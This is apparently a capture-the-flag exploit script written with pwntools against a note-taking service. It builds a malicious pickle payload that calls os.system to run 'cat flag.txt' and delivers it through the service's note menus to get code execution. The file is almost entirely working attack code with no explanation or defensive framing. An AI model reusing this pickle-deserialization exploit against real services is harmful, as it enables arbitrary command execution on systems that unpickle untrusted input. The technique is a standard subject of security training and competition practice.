# -*- coding: utf-8 -*-

from pwn import *
import pickle
import time

bomb = b"""cos\nsystem\n(S'cat flag.txt'\ntR."""

def setup(uuid=None):
    if uuid is not None:
        print p.recvuntil("do you have a uuid? (y/n)")
        p.sendline("y")

        print p.recvuntil("What is your uuid?")
        p.sendline(uuid)
    else:
        print p.recvuntil("do you have a uuid? (y/n)")
        p.sendline("n")

        uuid = p.recvline().strip().split(": ")[1]

    print p.recvuntil("username:")
    p.sendline("asasd")

    return uuid

# def setup():
#     print p.recvuntil("username:")
#     p.sendline("asas")   
 
def structured(choice, name, payload):
    print p.recvuntil("choice:")
    p.sendline("0")
    time.sleep(10)

    if choice == 0:
        print p.recvuntil("choice:")
        p.sendline(str(choice))

        p.recvuntil("note name:")
        p.sendline(name)

        p.recvuntil("note date:")
        p.sendline(payload)

        print p.recvuntil("note content:")
        p.sendline(payload)
        p.sendline("")
    else:
        print p.recvuntil("choice:")
        p.sendline("1")

        print p.recvuntil("note name:")
        p.sendline(name)

        print p.recvall()


def freeform(choice, name, payload):
    print p.recvuntil("choice:")
    p.sendline("1")

    if choice == 0:
        print p.recvuntil("choice:")
        p.sendline(str(choice))

        print p.recvuntil("note name:")
        p.sendline(name)

        print p.recvuntil("note content:")
        p.sendline(payload)
        p.sendline("")
    else:
        print p.recvuntil("choice:")
        p.sendline("1")

        print p.recvuntil("note name:")
        p.sendline(name)

        print p.recvall()


if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    HOST = "secret-pickle.420blaze.in"
    PORT = 420
else:
    HOST="localhost"
    PORT=31337

name = "ray"
if sys.argv[2] == '0':
    p = remote(HOST, PORT)
    uuid = setup()
    print "uuid is", uuid
    structured(1, 'asdf', bomb)
else: 
    p = remote(HOST, PORT)
    # setup(sys.argv[3])
    setup(sys.argv[3])
    freeform(0, 'asdf', bomb)